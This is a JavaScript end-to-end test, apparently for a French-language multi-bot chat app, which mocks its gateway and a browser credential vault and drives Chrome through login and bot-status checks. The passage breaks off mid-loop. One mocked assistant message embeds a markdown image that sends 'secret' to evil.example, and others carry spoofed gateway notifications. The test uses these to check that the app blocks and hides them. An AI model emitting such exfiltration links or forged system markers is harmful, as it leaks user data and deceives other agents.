import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { existsSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { spawn, execFile } from 'node:child_process'
import { promisify } from 'node:util'
import { createHash } from 'node:crypto'
import { WebSocketServer } from 'ws'
import { chromium } from 'playwright-core'

const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
const execFileAsync = promisify(execFile)
// Fichier de session de test (cookies factices), dans le dossier temporaire.
const SESSION_FILE = process.env.HERMESBOT_TEST_SESSION_FILE || path.join(os.tmpdir(), 'hermesbot-e2e-session.json')
const SAVED_LOGIN_FILE = `${SESSION_FILE}.credentials`
// Coffre CDP : service à part, sur un trousseau jetable (jamais celui de session).
const BROWSER_VAULT_KEYCHAIN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}.keychain-db`)
const BROWSER_VAULT_AUDIT = path.join(os.tmpdir(), 'hermesbot-e2e-browser-vault-audit.jsonl')
const BROWSER_VAULT_TOKEN = path.join(os.tmpdir(), `hermesbot-e2e-${process.pid}-vault.token`)
const BROWSER_SECRET = 'cdp-mot-de-passe-test-93842' // gitleaks:allow (faux mot de passe du test)
const BROWSER_CODE = '654321'
rmSync(SAVED_LOGIN_FILE, { force: true })
rmSync(BROWSER_VAULT_AUDIT, { force: true })
const SCREENSHOTS = new URL('screenshots/', import.meta.url).pathname
const BROWSER_TOUR_OWNER_FILE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-owner')
const BROWSER_TOUR_FIXTURE = path.join(os.tmpdir(), 'hermesbot-e2e-browser-turn.cjs')
rmSync(BROWSER_TOUR_OWNER_FILE, { force: true })
writeFileSync(BROWSER_TOUR_FIXTURE, `#!/usr/bin/env node
const fs = require('node:fs')
let owner = 'libre'
try { owner = fs.readFileSync(process.env.BROWSER_TOUR_OWNER_FILE, 'utf8').trim() || 'libre' } catch {}
console.log(\`tour : \${owner} 2026-01-05T10:00:00+0000 pid=123 depuis 1 min\\nen file : 0\`)
`, { mode: 0o700 })

// Fichiers que la fausse gateway sert pour les balises MEDIA: de orion.
const MEDIA_FIXTURES = {
  '/Users/test/visuels/slide 01.jpg': ['slide.jpg', 'image/jpeg'],
  '/Users/test/visuels/slide-02.png': ['slide.png', 'image/png'],
  '/Users/test/videos/video.mp4': ['video.mp4', 'video/mp4'],
  '/Users/test/docs/rapport.pdf': ['doc.pdf', 'application/pdf'],
  '/Users/test/docs/page.html': ['doc.html', 'text/html'],
  '/Users/test/docs/note.md': ['doc.md', 'text/markdown'],
}
const VIDEO_SIZE = readFileSync(new URL('fixtures/video.mp4', import.meta.url)).length
const mediaRequests = []
// Statut imposé à /api/auth/me : 503 pour une gateway injoignable, 401 pour une session expirée.
let forcedAuthStatus = 0
// Chaque connexion reçoit un cookie numéroté ; expirer les sessions, c’est refuser les numéros passés.
let cookieCounter = 0
let expiredBefore = 0
let loginCalls = 0
let loginRefused = false
let logoutCalls = 0
let sessionResumeCalls = 0
// Demandes de la gateway vers l’app (coffre, accords) et réponses reçues.
const clientResponses = new Map()
let capabilityCalls = 0
let openRequests = []
let lastPromptText = ''
// Tours vus par `session.active_list`, profil par profil : sans `profile`, la vraie gateway ne liste que `default`.
const liveStatusByProfile = {}
const activeListParams = []
let lastApiText
// Lenteur simulée de la gateway, pour voir les écrans de chargement, chat local isolé.
let profilesDelayMs = 0
let resumeDelayMs = 0
let emptyRoster = false
const localChatRequests = []
let localModelMissing = false
const fileAttachCalls = []
const steerCalls = []
const queuedPrompts = []
let steerVerdict = { status: 'queued', execution_generation: 1, authority_epoch: 1 }
const imageAttachCalls = []
const analyticsProfiles = []
const remoteRequests = []

function serveMediaFixture(request, response, url, route) {
  const file = url.searchParams.get('path') || ''
  const range = request.headers.range || ''
  mediaRequests.push({ route, path: file, profile: url.searchParams.get('profile'), range })
  const fixture = MEDIA_FIXTURES[file]
  if (!fixture) { response.statusCode = 404; return response.end(JSON.stringify({ detail: 'File not found' })) }
  if (route === 'stream' && !/\.(mp4|mov|webm|mp3|m4a|wav|ogg|opus|flac)$/i.test(file)) {
    response.statusCode = 415
    return response.end(JSON.stringify({ detail: 'Unsupported media type' }))
  }
  const data = readFileSync(new URL(`fixtures/${fixture[0]}`, import.meta.url))
  response.setHeader('Content-Type', fixture[1])
  response.setHeader('Accept-Ranges', 'bytes')
  // La vraie route de téléchargement répond en pièce jointe : le serveur local doit l’afficher en ligne.
  if (route === 'download') response.setHeader('Content-Disposition', `attachment; filename="${fixture[0]}"`)
  const match = /^bytes=(\d+)-(\d*)$/.exec(range)
  if (!match) {
    response.setHeader('Content-Length', data.length)
    return response.end(data)
  }
  const start = Number(match[1])
  const end = Math.min(match[2] ? Number(match[2]) : data.length - 1, data.length - 1)
  if (start > end) {
    response.statusCode = 416
    response.setHeader('Content-Range', `bytes */${data.length}`)
    return response.end()
  }
  response.statusCode = 206
  response.setHeader('Content-Range', `bytes ${start}-${end}/${data.length}`)
  response.setHeader('Content-Length', end - start + 1)
  response.end(data.subarray(start, end + 1))
}

const mock = http.createServer((request, response) => {
  const url = new URL(request.url, 'http://127.0.0.1:9121')
  response.setHeader('Content-Type', 'application/json')
  const authenticated = Number(/hermes_session=test-(\d+)/.exec(String(request.headers.cookie || ''))?.[1] || 0) > expiredBefore
  if (url.pathname === '/auth/password-login') {
    loginCalls += 1
    if (loginRefused) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'invalid_login' })) }
    cookieCounter += 1
    response.setHeader('Set-Cookie', `hermes_session=test-${cookieCounter}; Path=/; HttpOnly; SameSite=Lax`)
    return response.end(JSON.stringify({ ok: true, next: '/' }))
  }
  if (url.pathname === '/auth/logout') {
    logoutCalls += 1
    return response.end(JSON.stringify({ ok: true }))
  }
  if (url.pathname === '/api/auth/me') {
    if (forcedAuthStatus) { response.statusCode = forcedAuthStatus; return response.end(JSON.stringify({ error: 'forced' })) }
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ user_id: 'test', display_name: 'Test', provider: 'loopback' }))
  }
  if (url.pathname === '/api/webapp/socket-ticket') {
    response.statusCode = 403
    return response.end(JSON.stringify({ error: 'forbidden' }))
  }
  if (url.pathname === '/api/auth/ws-ticket') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ error: 'unauthenticated' })) }
    return response.end(JSON.stringify({ ticket: 'test-ticket', ttl_seconds: 30 }))
  }
  // Ollama simulé : même serveur, aucun modèle réel.
  if (url.pathname === '/api/chat' && request.method === 'POST') {
    const chunks = []
    request.on('data', (chunk) => chunks.push(chunk))
    request.on('end', () => {
      localChatRequests.push(JSON.parse(Buffer.concat(chunks).toString()))
      if (localModelMissing) { response.statusCode = 404; return response.end(JSON.stringify({ error: 'model not found' })) }
      response.setHeader('Content-Type', 'application/x-ndjson')
      const write = (message, done = false) => response.write(`${JSON.stringify({ message: { role: 'assistant', ...message }, done })}\n`)
      setTimeout(() => write({ content: '<think>je réfléchis' }), 30)
      setTimeout(() => write({ content: '</think>Réponse ' }), 60)
      setTimeout(() => write({ content: 'du modèle local.' }), 90)
      setTimeout(() => { write({ content: '' }, true); response.end() }, 130)
    })
    return
  }
  if (url.pathname === '/api/analytics/usage') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    analyticsProfiles.push(url.searchParams.get('profile'))
    const now = new Date()
    const day = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')}`
    return response.end(JSON.stringify({
      daily: [{ day, input_tokens: 100_000, output_tokens: 5_000, cache_read_tokens: 1_000, reasoning_tokens: 0, estimated_cost: 0.5, actual_cost: 0, sessions: 2, api_calls: 9 }],
      by_model: [{ model: 'claude-opus-5-5', input_tokens: 100_000, output_tokens: 5_000, estimated_cost: 0.5, sessions: 2, api_calls: 9 }],
      totals: { total_input: 100_000, total_output: 5_000, total_cache_read: 1_000, total_reasoning: 0, total_estimated_cost: 0.5, total_actual_cost: 0, total_sessions: 2, total_api_calls: 9 },
      period_days: Number(url.searchParams.get('days')), skills: [], tools: [],
    }))
  }
  if (url.pathname === '/api/cron/jobs') return response.end(JSON.stringify([{ id: 'routine-test', name: 'Nova: Routine test', enabled: true, schedule_display: '0 9 * * *', next_run_at: '2025-01-07T02:00:00Z' }]))
  if (url.pathname === '/api/fs/download' || url.pathname === '/api/files/stream') {
    if (!authenticated) { response.statusCode = 401; return response.end(JSON.stringify({ detail: 'Unauthorized' })) }
    return serveMediaFixture(request, response, url, url.pathname === '/api/fs/download' ? 'download' : 'stream')
  }
  response.statusCode = 404
  response.end(JSON.stringify({ error: 'not_found' }))
})

const wss = new WebSocketServer({
  noServer: true,
  handleProtocols: (protocols) => protocols.has('hermes-gateway-v1') ? 'hermes-gateway-v1' : false,
})
let profilesListCalls = 0
let promptCalls = 0
const modelMutations = []

const profiles = [{
  name: 'nova', model: 'claude-opus-5-5', description: 'Coordinateur',
  canonical_session: { id: 'chat-nova', resolved_id: 'chat-nova', preview: 'Bonjour.', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Nova', description: 'Coordinateur', sectionId: 'direction', sectionName: 'Direction', shape: 'blob', color: 'black' } },
}, {
  name: 'orion', model: 'claude-opus-5-5', description: 'Assistant de test',
  canonical_session: { id: 'chat-orion', resolved_id: 'chat-orion', preview: 'NOREPLY', last_active: Date.now(), running: false },
  ui_meta: { 'hermes-bots': { title: 'Orion', description: 'Assistant de test', sectionId: 'produit', sectionName: 'Produit', shape: 'squircle', color: 'red' } },
}, {
  name: 'default', is_default: true, model: 'claude-opus-5-5',
  canonical_session: { id: 'chat-default', resolved_id: 'chat-default' },
  ui_meta: {},
}, {
  name: 'systeme', model: 'modele-test',
  canonical_session: { id: 'chat-systeme', resolved_id: 'chat-systeme' },
  ui_meta: {},
}]

function send(socket, value) { socket.send(JSON.stringify(value)) }
function event(sessionId, type, payload) {
  return { jsonrpc: '2.0', method: 'event', params: { type, session_id: sessionId, execution_generation: 1, payload } }
}

wss.on('connection', (socket) => {
  send(socket, { jsonrpc: '2.0', method: 'event', params: { type: 'gateway.ready', payload: { session_authority: true } } })
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    if (!frame.id) return
    if (frame.method === undefined) { clientResponses.set(frame.id, frame); return }
    const delayMs = frame.method === 'profiles.list' ? profilesDelayMs : frame.method === 'session.resume' ? resumeDelayMs : 0
    const reply = (result) => { if (delayMs) setTimeout(() => send(socket, { jsonrpc: '2.0', id: frame.id, result }), delayMs); else send(socket, { jsonrpc: '2.0', id: frame.id, result }) }
    if (frame.method === 'client.capabilities') {
      if (frame.params.server_requests === true) capabilityCalls += 1
      return reply({ server_requests: [], declines_not_shown: true })
    }
    if (frame.method === 'profiles.list') {
      profilesListCalls += 1
      return reply({ profiles: emptyRoster ? [] : profiles, bot_mode_protocol: true })
    }
    if (frame.method === 'session.resume') {
      sessionResumeCalls += 1
      const sessionId = frame.params.session_id
      return reply({
        session_id: sessionId, revision: 4, execution_generation: 1, running: false, subscription_id: 'sub-test',
        open_requests: openRequests,
        messages: [
          ...Array.from({ length: 30 }, (_, index) => ({
            row_id: index + 1, role: index % 2 ? 'assistant' : 'user', content: `Message ${index + 1}`, timestamp: Date.now() - 120_000 + index * 1000,
          })),
          { row_id: 31, role: 'user', content: 'Présente-toi.', timestamp: Date.now() - 60_000 },
          { row_id: 32, role: 'assistant', content: 'Je suis ton bot Hermes de test.', timestamp: Date.now() - 50_000 },
          ...(sessionId === 'chat-orion' ? [
            { row_id: 33, role: 'assistant', content: '![preuve](https://evil.example/fuite?d=secret)', timestamp: Date.now() - 45_000 },
            { row_id: 133, role: 'user', content: '[IMPORTANT: Background process proc_test completed normally (exit code 0).\nOutput:\nok]\n\n[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]', timestamp: Date.now() - 44_000 },
            { row_id: 134, role: 'user', display_kind: 'async_delegation_complete', content: 'Délégation terminée sans préfixe connu', timestamp: Date.now() - 43_000 },
            { row_id: 136, role: 'user', content: 'Message from 🤖 Nova (@nova): demande entre bots', timestamp: Date.now() - 42_500 },
            { role: 'tool', name: 'message_agent', tool_call_id: 'call-dm-nova', timestamp: Date.now() - 42_400, args: { target: 'nova', message: 'Peux-tu relire le **plan** ?', expecting: 'Un OK écrit' } },
            {
              row_id: 137, role: 'user', display_kind: 'process_complete', timestamp: Date.now() - 42_300, content: [
                '[IMPORTANT: Background process proc_dm completed normally (exit code 0).',
                `Command: /x/python3 /x/tools/bot_mode_dm.py --run-delivery --author '{"id":"bot:orion","name":"orion","is_bot":true}' query-file /tmp/dm.txt --profile-home /x/profiles/nova /x/bin/hermes -p nova`,
                'Output:',
                JSON.stringify({ outcome: '@nova answered.', reply: 'Plan relu, OK écrit. Aperçu : `/Users/test/visuels/slide-02.png`', status: 'settled', delivery_id: 'd1' }),
                ']',
                '',
                '[INTERNAL NOTIFICATION — generated by the Hermes gateway, not written by a human user.]',
              ].join('\n'),
            },
            { row_id: 135, role: 'user', display_kind: 'steer', content: '[OUT-OF-BAND USER MESSAGE — a direct message from the user]\nMessage glissé pendant le tour\n[/OUT-OF-BAND USER MESSAGE]', timestamp: Date.now() - 42_000 },
            { row_id: 34, role: 'assistant', content: 'NOREPLY', timestamp: Date.now() - 40_000 },
            {
              row_id: 35, role: 'assistant', timestamp: Date.now() - 39_000, content: [
                'Voici les images à valider :',
                '',
                'MEDIA:/Users/test/visuels/slide 01.jpg',
                'MEDIA:/Users/test/visuels/slide-02.png',
                '',
                'Et la vidéo :',
                '',
                'MEDIA:/Users/test/videos/video.mp4',
                '',
                'Celle-ci a disparu : MEDIA:/Users/test/visuels/absent.jpg',
                '',
                '```',
                'MEDIA:/Users/test/exemple-de-syntaxe.png',
                '```',
              ].join('\n'),
            },
            { row_id: 36, role: 'user', content: 'Regarde avec @nova\n\n@file:attachments/ancien.pdf\n\n[@mentions resolved from the Bot Mode roster — the user is referring to: @nova = agent profile "nova" ("Nova"). If they want one of these agents contacted, compose your own message.]', timestamp: Date.now() - 38_000 },
            { row_id: 37, role: 'assistant', content: 'Les documents :\n\nMEDIA:/Users/test/docs/rapport.pdf\n\nMEDIA:/Users/test/docs/page.html\n\nMEDIA:/Users/test/docs/note.md', timestamp: Date.now() - 37_000 },
            // Rendu cité par chemin, sans MEDIA:, comme le font certains bots.
            { row_id: 38, role: 'assistant', content: 'Rendu prêt, rien de publié.\n\n**Fichiers** (dossier `/Users/test/visuels/`)\n- Vidéo : `/Users/test/videos/video.mp4`, 57 s.\n- Planche : `slide-02.png`\n- Manquante : `absente.png`\n\n```\nls /Users/test/videos/exemple-cite.mp4\n```', timestamp: Date.now() - 36_000 },
          ] : []),
        ],
      })
    }
    if (frame.method === 'session.history') return reply({ messages: [] })
    if (frame.method === 'session.active_list') {
      activeListParams.push(frame.params)
      const status = liveStatusByProfile[frame.params.profile]
      return reply({ sessions: status ? [{ id: `chat-${frame.params.profile}`, session_key: `chat-${frame.params.profile}`, status }] : [] })
    }
    if (frame.method === 'session.events.since') return reply({ events: [], latest_seq: 0, truncated: false, count: 0, epoch: 'test', open_requests: [] })
    if (frame.method === 'model.options') {
      return reply({
        model: 'claude-opus-5-5', provider: 'anthropic',
        providers: [
          { slug: 'anthropic', name: 'Anthropic', authenticated: true, models: ['claude-opus-5-5', 'claude-sonnet-5-5'], pricing: { 'claude-sonnet-5-5': { input: '$2', output: '$10', free: false } } },
          { slug: 'kimi-coding', name: 'Kimi / Moonshot', authenticated: true, models: ['kimi-k3', 'kimi-for-coding'] },
          { slug: 'custom:omlx', name: 'Qwen local (oMLX)', authenticated: true, models: ['qwen-local-27b'] },
          { slug: 'lmstudio', name: 'LM Studio', authenticated: true, models: ['gemma-local'] },
          { slug: 'absent', name: 'Non connecté', authenticated: false, models: ['modele-interdit'] },
        ],
      })
    }
    if (frame.method === 'session.mutate') {
      modelMutations.push(frame.params)
      if (frame.params.operation !== 'model') throw new Error(`Mutation inattendue: ${frame.params.operation}`)
      if (!frame.params.payload.confirm) {
        return reply({ session_id: frame.params.session_id, operation: 'model', status: 'confirmation_required', confirm: 'confirm-test', confirm_message: 'Confirmer le modèle de test ?', payload: frame.params.payload })
      }
      return reply({ session_id: frame.params.session_id, operation: 'model', model: frame.params.payload.model, provider: frame.params.payload.provider, revision: frame.params.expected_revision + 1, execution_generation: frame.params.expected_generation })
    }
    if (frame.method === 'session.stats') {
      return reply({ input_tokens: 120_000, output_tokens: 8_000, cache_read_tokens: 90_000, cache_write_tokens: 5_000, prompt_tokens: 120_000, completion_tokens: 8_000, total_tokens: 128_000, reasoning_tokens: 900, api_calls: 14, last_prompt_tokens: 41_000, context_tokens: 41_000, context_length: 1_000_000, context_source: 'provider_usage', compression_count: 1, avg_latency_s: 2.5, tokens_per_s: 62.6, last_turn_tokens: 300, active_subagents: 0, model: 'claude-opus-5-5', provider: 'anthropic' })
    }
    if (frame.method === 'session.context_breakdown') {
      return reply({ categories: [{ id: 'conversation', label: 'Conversation', tokens: 30_000, color: '#000' }, { id: 'system', label: 'Instructions', tokens: 11_000, color: '#111' }], context_max: 1_000_000, context_percent: 4.1, context_used: 41_000, estimated_total: 41_000, context_estimated: true, context_source: 'estimate', model: 'claude-opus-5-5', context_files: [{ label: 'SOUL.md', path: '/x/SOUL.md', chars: 100, est_tokens: 25, loaded: true, status: 'ok' }] })
    }
    if (frame.method === 'session.steer') {
      steerCalls.push(frame.params)
      return reply({ text: frame.params.text, ...steerVerdict })
    }
    if (frame.method === 'file.attach') {
      fileAttachCalls.push(frame.params)
      return reply({ attached: true, name: frame.params.name, path: `/x/${frame.params.name}`, ref_path: `attachments/${frame.params.name}`, ref_text: `@file:attachments/${frame.params.name}`, uploaded: true })
    }
    if (frame.method === 'image.attach_bytes') {
      imageAttachCalls.push(frame.params)
      return reply({ attached: true, path: `/x/${frame.params.filename}`, mime: 'image/png' })
    }
    if (frame.method === 'session.usage') return reply({ context_used: 41_000, context_max: 1_000_000, context_percent: 4.1, avg_tps: 62.6, total: 500 })
    if (frame.method === 'prompt.submit') {
      if (frame.params.queued === true) {
        queuedPrompts.push(frame.params.text)
        return reply({ admission_id: 'admission-file', status: 'queued', execution_generation: 1 })
      }
      promptCalls += 1
      const sessionId = frame.params.session_id
      reply({ admission_id: 'admission-test', status: 'started', execution_generation: 1 })
      const at = (ms, type, payload) => setTimeout(() => send(socket, event(sessionId, type, payload)), ms)
      if (frame.params.text === 'Test média en direct') {
        const final = 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n\nEt la suite du texte.'
        at(30, 'message.start', { turn_id: 'turn-media' })
        at(80, 'message.delta', { turn_id: 'turn-media', text: 'Voici la vidéo :\n\nMEDIA:/Users/test/videos/video.mp4\n' })
        at(1800, 'message.delta', { turn_id: 'turn-media', text: '\nEt la suite du texte.' })
        at(2600, 'message.complete', { turn_id: 'turn-media', text: final, status: 'complete' })
        return
      }
      lastPromptText = frame.params.text
      lastApiText = frame.params.api_text
      if (frame.params.text === 'Test pilotage') {
        at(30, 'message.start', { turn_id: 'turn-pilotage' })
        at(1800, 'message.complete', { turn_id: 'turn-pilotage', text: 'Pilotage terminé.', status: 'complete' })
        return
      }
      if (/^(?:Vois avec|Regarde ça|Test mode)/.test(frame.params.text)) {
        at(30, 'message.start', { turn_id: 'turn-piece' })
        at(90, 'message.complete', { turn_id: 'turn-piece', text: 'Bien reçu.', status: 'complete' })
        return
      }
      if (frame.params.text.startsWith('Test mail')) {
        const id = frame.params.text.split(' ').pop()
        const draft = ['````hermes-mail', `Id: ${id}`, 'Draft-Id: 77', 'From: Bot <bot@exemple.test>', 'To: contact@exemple.test', 'Cc:', 'Subject: Re: Votre demande', 'Reply-Label: « Votre demande » de Contact', '', 'Bonjour,', '', 'Voici notre réponse.', '````'].join('\n')
        at(30, 'message.start', { turn_id: 'turn-mail' })
        at(80, 'message.delta', { turn_id: 'turn-mail', text: draft.slice(0, 70) })
        at(900, 'message.complete', { turn_id: 'turn-mail', text: `Brouillon à valider :\n\n${draft}`, status: 'complete' })
        return
      }
      if (frame.params.text === 'Test silence') {
        at(30, 'message.start', { turn_id: 'turn-silence' })
        at(80, 'message.delta', { turn_id: 'turn-silence', text: 'NO' })
        at(300, 'message.delta', { turn_id: 'turn-silence', text: 'REPLY' })
        at(900, 'message.complete', { turn_id: 'turn-silence', text: 'NOREPLY', status: 'complete' })
        return
      }
      setTimeout(() => send(socket, event(sessionId, 'message.start', { turn_id: 'turn-test' })), 30)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Réponse ' })), 60)
      setTimeout(() => send(socket, event(sessionId, 'message.delta', { turn_id: 'turn-test', text: 'Hermes simulée.' })), 90)
      const turnMs = frame.params.text === 'Test animation' ? 3000 : 130
      setTimeout(() => send(socket, event(sessionId, 'message.complete', { turn_id: 'turn-test', text: 'Réponse Hermes simulée.', status: 'complete' })), turnMs)
      return
    }
    if (frame.method === 'session.interrupt') return reply({ execution_state: 'idle', execution_generation: 1 })
    send(socket, { jsonrpc: '2.0', id: frame.id, error: { code: 4000, message: `unknown ${frame.method}` } })
  })
})

mock.on('upgrade', (request, socket, head) => {
  if (new URL(request.url, 'http://127.0.0.1:9121').pathname !== '/api/ws') return socket.destroy()
  wss.handleUpgrade(request, socket, head, (client) => wss.emit('connection', client, request))
})

// Chrome CDP simulé : aucune navigation réelle et aucun bot payant.
let cdpUrl = 'https://store.steampowered.com/login/'
const cdpExpressions = []
const cdpInjections = []
const cdpMock = http.createServer((request, response) => {
  if (request.url !== '/json/list') { response.statusCode = 404; return response.end() }
  response.setHeader('Content-Type', 'application/json')
  response.end(JSON.stringify([
    { id: 'onglet-leurre', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-leurre' },
    { id: 'onglet-steam', type: 'page', url: cdpUrl, webSocketDebuggerUrl: 'ws://127.0.0.1:9223/devtools/page/onglet-steam' },
  ]))
})
const cdpWss = new WebSocketServer({ noServer: true })
cdpWss.on('connection', (socket, request) => {
  const target = request.url.split('/').pop()
  socket.on('message', (raw) => {
    const frame = JSON.parse(String(raw))
    const { id, method, params } = frame
    if (method === 'Runtime.evaluate') {
      cdpExpressions.push(params.expression)
      if (params.expression === 'window.location.origin') {
        return send(socket, { id, result: { result: { type: 'string', value: new URL(cdpUrl).origin } } })
      }
      return send(socket, { id, result: { result: { type: 'object', objectId: 'champs-actifs' } } })
    }
    if (method === 'Runtime.callFunctionOn') {
      const values = params.arguments.map((argument) => argument.value)
      cdpInjections.push({ target, origin: new URL(cdpUrl).origin, values })
      const filled = values.length === 2 ? ['identifier', 'password'] : ['code']
      return send(socket, { id, result: { result: { type: 'object', value: { filled } } } })
    }
    send(socket, { id, error: { message: 'unsupported' } })
  })
})
cdpMock.on('upgrade', (request, socket, head) => {
  if (!/^\/devtools\/page\/(onglet-leurre|onglet-steam)$/.test(request.url)) return socket.destroy()
  cdpWss.handleUpgrade(request, socket, head, (client) => cdpWss.emit('connection', client, request))
})

let child
let vaultService
let browser
try {
  await new Promise((resolve) => mock.listen(9121, '127.0.0.1', resolve))
  await new Promise((resolve) => cdpMock.listen(9223, '127.0.0.1', resolve))
  for (const args of [['create-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['unlock-keychain', '-p', 'e2e', BROWSER_VAULT_KEYCHAIN], ['set-keychain-settings', BROWSER_VAULT_KEYCHAIN]]) {
    await execFileAsync('/usr/bin/security', args)
  }
  vaultService = spawn(process.execPath, ['server/browser-vault/standalone.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env, BROWSER_VAULT_PORT: '4333', BROWSER_VAULT_CDP_ORIGIN: 'http://127.0.0.1:9223',
      HERMESBOT_KEYCHAIN: BROWSER_VAULT_KEYCHAIN, HERMESBOT_VAULT_AUDIT: BROWSER_VAULT_AUDIT, HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      HERMES_ORIGIN: 'http://127.0.0.1:9121',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let vaultLog = ''
  vaultService.stdout.on('data', (data) => { vaultLog += data })
  vaultService.stderr.on('data', (data) => { vaultLog += data })
  for (let attempt = 0; attempt < 50 && !vaultLog.includes('Coffre HermesBot'); attempt += 1) await delay(100)
  if (!vaultLog.includes('Coffre HermesBot')) throw new Error(`Le coffre ne démarre pas : ${vaultLog}`)
  child = spawn(process.execPath, ['server/index.mjs'], {
    cwd: new URL('..', import.meta.url),
    env: {
      ...process.env,
      NODE_ENV: 'development', PORT: '4332', HERMES_ORIGIN: 'http://127.0.0.1:9121', OLLAMA_ORIGIN: 'http://127.0.0.1:9121',
      BROWSER_VAULT_PORT: '4333', HERMESBOT_VAULT_TOKEN_FILE: BROWSER_VAULT_TOKEN,
      BROWSER_TOUR_COMMAND: BROWSER_TOUR_FIXTURE, BROWSER_TOUR_OWNER_FILE,
      NODE_OPTIONS: `--require ${new URL('persistence-hook.cjs', import.meta.url).pathname}`,
      HERMESBOT_TEST_SESSION_FILE: SESSION_FILE,
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  })
  let serverLog = ''
  child.stdout.on('data', (data) => { serverLog += data })
  child.stderr.on('data', (data) => { serverLog += data })
  let ready = false
  for (let attempt = 0; attempt < 50; attempt += 1) {
    try { if ((await fetch('http://127.0.0.1:4332/api/health')).ok) { ready = true; break } } catch { /* serveur pas prêt */ }
    await delay(100)
  }
  if (!ready) throw new Error(`Serveur de test indisponible: ${serverLog}`)

  if ((await fetch('http://127.0.0.1:4332/api/health', { headers: { Origin: 'null' } })).status !== 403) throw new Error('Origin null accepté.')

  browser = await chromium.launch({ headless: true, channel: 'chrome' })
  const page = await browser.newPage({ viewport: { width: 1280, height: 800 } })
  const errors = []
  page.on('pageerror', (error) => errors.push(error.message))
  // Chromium annonce la requête avant que la CSP la bloque : seul un refus CSP la retire de la liste.
  page.on('request', (request) => { if (request.url().includes('evil.example')) remoteRequests.push(request.url()) })
  page.on('requestfailed', (request) => {
    if (request.failure()?.errorText === 'csp') remoteRequests.splice(remoteRequests.indexOf(request.url()), 1)
  })
  await page.goto('http://127.0.0.1:4332/', { waitUntil: 'domcontentloaded' })
  await page.locator('.login-card').waitFor({ timeout: 15_000 })
  await page.getByLabel('Identifiant Hermes').fill('test')
  await page.getByLabel('Mot de passe').fill('test')
  // Gateway lente : écran d’attente, jamais « Aucun bot », puis squelette de la conversation.
  profilesDelayMs = 900
  resumeDelayMs = 900
  await page.getByRole('button', { name: 'Ouvrir mes bots' }).click()
  await page.locator('.app-loading').getByText('Chargement de tes bots…').waitFor({ timeout: 5_000 })
  await page.locator('.loading-bar i').waitFor({ timeout: 1_000 })
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  await page.screenshot({ path: `${SCREENSHOTS}loading-app.png` })
  await page.locator('.chat-skeleton span').first().waitFor({ timeout: 5_000 })
  await page.locator('.chat-loading').getByText('Ouverture de la conversation avec Nova…').waitFor({ timeout: 1_000 })
  await page.screenshot({ path: `${SCREENSHOTS}loading-chat.png` })
  if (await page.getByText('Aucun bot à afficher').count()) throw new Error('« Aucun bot » affiché pendant le chargement.')
  profilesDelayMs = 0
  resumeDelayMs = 0
  await page.locator('.chat-loading').waitFor({ state: 'detached', timeout: 5_000 })
  await page.locator('[data-bot=nova]').waitFor({ timeout: 15_000 })
  if (await page.locator('.bot-row').count() !== 3) throw new Error('Le roster doit montrer Nova, Orion et le chat local, sans les profils système.')
  await page.getByText('Je suis ton bot Hermes de test.').waitFor()
  await page.getByRole('textbox', { name: 'Message à Nova' }).fill('Test animation')
  await page.getByRole('textbox', { name: 'Message à Nova' }).press('Enter')
  await page.locator('.details-panel .live-avatar.is-working').waitFor({ timeout: 5_000 })
  // Statut visible d’un coup d’œil : bandeau, ligne du roster, en-tête du chat.
  await page.locator('.working-strip.has-work').getByText('1 au travail').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-working').waitFor({ timeout: 2_000 })
  await page.locator('[data-bot=nova] .live-avatar.is-working').waitFor({ timeout: 2_000 })
  await page.locator('.chat-identity.is-working .chat-status').getByText('Au travail').waitFor({ timeout: 2_000 })
  await delay(600) // laisse finir les entrées animées : Chrome sans interface ne les avance qu’à la demande
  await page.screenshot({ path: `${SCREENSHOTS}nova-working-ui.png` })
  await page.locator('.details-panel .live-avatar.is-done').waitFor({ timeout: 6_000 })
  await page.locator('[data-bot=nova] .bot-row-status.is-done').getByText('Terminé').waitFor({ timeout: 2_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 2_000 })
  await page.screenshot({ path: `${SCREENSHOTS}nova-done-ui.png` })
  // Bot jamais ouvert, réveillé par un autre bot : seul son `session.active_list` le dit au travail.
  liveStatusByProfile.orion = 'working'
  await page.locator('[data-bot=orion] .bot-row-status.is-working').waitFor({ timeout: 9_000 })
  if (!activeListParams.some((params) => params.profile === 'orion')) throw new Error('session.active_list n’est pas demandé pour le profil du bot.')
  delete liveStatusByProfile.orion
  await page.locator('[data-bot=orion] .bot-row-status.is-done').waitFor({ timeout: 9_000 })
  await page.locator('.working-strip').getByText('Tous les bots sont disponibles').waitFor({ timeout: 9_000 })
  await page.locator('[data-bot=orion]').click()
  await page.locator('[data-bot=orion].is-selected').waitFor()
  if (await page.locator('.messages-scroll').getByText('NOREPLY').count()) throw new Error('NOREPLY est visible dans le chat.')
  for (const hidden of ['Background process', 'Délégation terminée', 'demande entre bots', 'OUT-OF-BAND']) {
